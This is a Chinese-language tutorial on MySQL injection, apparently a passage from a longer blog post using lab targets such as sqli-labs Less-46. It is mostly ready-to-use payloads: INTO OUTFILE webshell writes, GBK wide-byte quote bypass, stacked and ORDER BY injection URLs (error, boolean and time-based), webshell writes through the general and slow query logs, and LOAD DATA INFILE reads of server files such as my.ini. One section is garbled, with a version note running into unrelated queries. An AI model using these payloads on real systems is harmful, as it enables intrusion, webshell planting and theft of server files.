写入一句话木马
    Select  into outfile “c:\\phpnow\\htdocs\\test.php”
修改文件尾
    select version() into outfile "D:\\phpstudy_pro\\WWW\\phpinfo.php" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e
lines terminated by后写16进制字符串 本来默认是\r\n现在可以自己设置  
如果load_file不显示，我们可以导入到别的文件中
    select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile
    ‘c:\\wamp\\www\\test.php
## 宽字节注入
原理： mysql 在使用 GBK 编码的时候， 会认为两个字符为一个汉字， 例如%aa%5c 就是一个  
汉字（前一个 ascii 码大于 128 才能到汉字的范围） 。 我们在过滤 ’ 的时候， 往往利用的思  
路是将 ‘ 转换为 \’  
因此我们在此想办法将 ‘ 前面添加的 \ 除掉， 一般有两种思路：  
1、 %df 吃掉 \ 具体的原因是 urlencode(\') = %5c%27， 我们在%5c%27 前面添加%df， 形  
成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此  
事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面，同时也就进行了闭合。  
2、 将 \' 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c  
给注释掉。 这也是 bypass 的一种方法。  
%df%27 浏览器url自动解码===> β\' 转为16进制===> 0xdf0x5c0x27 转换为url编码===> %df%5c%27
进行url解码(因为是GBK编码，%df和%5c结合为汉字)===> 运'
**我们以墨者学院靶场为例**
由于'会被转码为\' 放到数据库 %27\会被转换 而'会留下 编程了 '-1运'
造成闭合之后我们就可以执行命令，而且在要注意一个点就是table_name这里的单引号也会被转义，于是我们直接给他转成16进制，数据库会自动给我们将16进制转换为字符串
得到最终结果
## 堆叠注入
mysql数据库[sql语句](https://so.csdn.net/so/search?q=sql%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020)的默认结束符是以;结尾，在执行多条SQL语句时就要使用结束符隔开，那么在；结束一条sql语句后继续构造下一条语句，是否会一起执行
我们发现确实同时执行了，那么在实际中我们引号闭合之后也有可能可以进行堆叠注入，但是堆叠注入和开发也有一定的关系，堆叠注入的局限性在于并不是每一个环境下都可以执行，
可能受到 API 或者数据库引擎不支持的限制， 当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。
## order by后的注入
字面意思就是我们传的参数只能在order by之后  
解决方案① 报错注入
    http://sql.com/Less-46/?sort=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2)))
直接进行select查询，因为只要报错就会停止返回报错信息，我们不需要管是否排序或者排序是否会报错  
解决方案② 利用rand函数  
我们之前说rand里面添加数值他的内容就不会改变了
我们记住rand为true或者false的排序方式，和以下payload的返回结果进行判断来判断结果是否正确
    http://sql.com/Less-46/?sort=rand(ascii(left(database(),1))=115)
解决方案③ 延时注入  
payload
    http://sql.com/Less-46/?sort=1%20and%20If(ascii(substr(database(),1,1))=116,0,sleep(5))
rand函数是看返回结果，那我们直接用延迟函数看网站是否延迟会更方便  
解决方案④ procedure analyse参数后注入  
**此方法仅适用于5.0.0  select '' into outfile 'E:/1.txt';
    Query OK, 1 row affected (0.00 sec)
    mysql> select '' into outfile 'E:/1.txt';
    Query OK, 1 row affected (0.00 sec)
    use test;
    drop table if exists vow;
    create table vow(name text not null);
    insert into vow(name) values('');
    select name from vow into outfile 'E:/5.txt';
    drop tables vow;
**②基于log日志写shell法**
    查询当前mysql下log日志的默认地址，同时也看下log日志是否为开启状态，并且记录下原地址，方便后面恢复。
    set global general_log = on;
    开启日志监测，一般是关闭的，如果一直开，文件会很大的。
    set global general_log_file = ‘G:/2.php’;
    这里设置我们需要写入的路径就可以了。
    select ‘’;
    查询一个一句话，这个时候log日志里就会记录这个。
    set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;
    结束后，再修改为原来的路径。
    set global general_log = off;
    关闭下日志记录。
最后利用文件包含漏洞获取shell  
**③通过慢日志查询获得webshell**  
对日志量庞大，直接访问日志网页极有可能出现 500 错误。通过开启慢查询日志，记录了超时 10s 的 SQL，这样页面的代码量会减轻很多不易导致 500,
配置可解析日志文GETSHELL
    show variables like '%slow%'; #查询慢日志配置
long_query_time 的默认值为 10，意思是运行 10S 以上的语句。该值可以指定为微秒的分辨率。具体指运行时间超过
long_query_time 值的 SQL，则会被记录到慢查询日志中。
    set GLOBAL slow_query_log_file='D:/phpStudy2016/WWW/slow.php'; #配置慢日志的保存位置
    set GLOBAL slow_query_log=on;
    set GLOBAL log_queries_not_using_indexes=on;
    select '' from mysql.db where sleep(10);
# 通过MySQL LOAD DATA特性来达到任意文件读取
如果我们能连接服务器的数据库，但是数据库没有可用的信息，我们可以用load data infile命令读取服务器上的文件内容并存入表中  
**先决条件**
    show variables like '%secure%'
secure_file_priv为空 代表可用读取硬盘上所有的文件  
**读取服务器文件load data infile**  
我们创建一个txt文件
    "1","pwd1"
    "2","pwd2"
使用命令读取d盘的txt文件，存到test库中的user表中
    load data infile 'D:/test.txt' into table user fields terminated by ',';
**读取客户端文件load data local infile**